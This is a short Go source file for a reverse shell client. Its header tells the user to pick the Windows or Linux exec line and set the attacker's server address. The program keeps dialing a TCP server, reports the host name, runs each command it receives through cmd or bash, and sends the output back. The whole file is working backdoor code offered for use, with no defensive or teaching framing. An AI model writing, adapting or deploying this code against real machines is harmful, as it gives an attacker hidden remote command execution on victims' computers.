/*
	Reverse Shell Client
	- Before compiling select the exec.Command line depending on target OS and
	  change IP const with the server addr.
*/
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

const IP = "localhost:4321" // Server IP

func main() {
	for {
		c, err := net.Dial("tcp", IP)
		if err != nil {
			fmt.Println("Trying to connect...")
		} else {
			name, err := os.Hostname()
			result := ""
			if err != nil {
				result = "Unknown connected"
			} else {
				result = name + " connected"
			}

			for {
				fmt.Fprintf(c, result+"\n¬")
				message, _ := bufio.NewReader(c).ReadString('\n')
				fmt.Print("> " + message)
				clean := strings.TrimSpace(string(message))
				if clean == "STOP" {
					break
				}

				//############################################################
				cmd := exec.Command("cmd", "@cmd", "/c", clean) // Windows
				//cmd := exec.Command("bash", "-c", clean)      // Linux
				//############################################################

				out, err := cmd.CombinedOutput()
				if err != nil {
					result = err.Error()
				} else {
					result = string(out)
				}
			}
		}
	}
}
